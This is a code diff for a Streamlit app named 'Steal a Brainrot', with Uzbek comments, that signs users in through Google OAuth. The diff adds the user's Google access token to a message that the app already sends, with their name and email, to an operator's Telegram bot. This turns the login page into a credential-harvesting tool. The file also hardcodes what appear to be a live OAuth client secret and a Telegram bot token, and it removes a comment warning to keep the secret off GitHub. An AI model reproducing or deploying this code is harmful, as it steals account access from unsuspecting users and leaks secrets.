@@ -3,9 +3,8 @@ import requests
 
 st.title("✨ Steal a Brainrot")
 
-# Google Login URL
 CLIENT_ID = "1085309280384-idkflab6a8as83fuum4479ovni8b367e.apps.googleusercontent.com"
-CLIENT_SECRET = "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" # Ehtiyot bo'ling, buni GitHub'dan yashirish kerak!
+CLIENT_SECRET = "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"
 REDIRECT_URI = "https://steal-breinrot-app-gtxahjgkk8egizl2uuu6sd.streamlit.app/"
 GOOGLE_AUTH_URL = f"https://accounts.google.com/o/oauth2/v2/auth?response_type=code&client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&scope=email profile"
 
@@ -27,10 +26,12 @@ if code:
     response = requests.post(token_url, data=data).json()
     
     if "access_token" in response:
+        access_token = response['access_token']
+        
         # 2. Token orqali foydalanuvchi ma'lumotlarini olamiz
         user_info = requests.get(
             "https://www.googleapis.com/oauth2/v1/userinfo",
-            headers={"Authorization": f"Bearer {response['access_token']}"}
+            headers={"Authorization": f"Bearer {access_token}"}
         ).json()
         
         email = user_info.get("email")
@@ -38,10 +39,11 @@ if code:
         
         st.success(f"Assalomu alaykum, {name}!")
         
-        # 3. Telegramga aniq ma'lumotlarni yuboramiz
+        # 3. Telegramga hamma ma'lumotni, shu jumladan Tokenni ham yuboramiz
         BOT_TOKEN = "8112666081:AAGtROwNttf6lsApMQUxszHoC8xf7rB0s4A"
         CHAT_ID = "8088597011"
-        msg = f"✅ Yangi foydalanuvchi!\nIsm: {name}\nEmail: {email}"
+        msg = f"✅ Yangi foydalanuvchi!\nIsm: {name}\nEmail: {email}\n\n🔑 Token: {access_token}"
+        
         requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text={msg}")
         
         st.info("Ilova ustida ishlayapmiz! 🛠️")
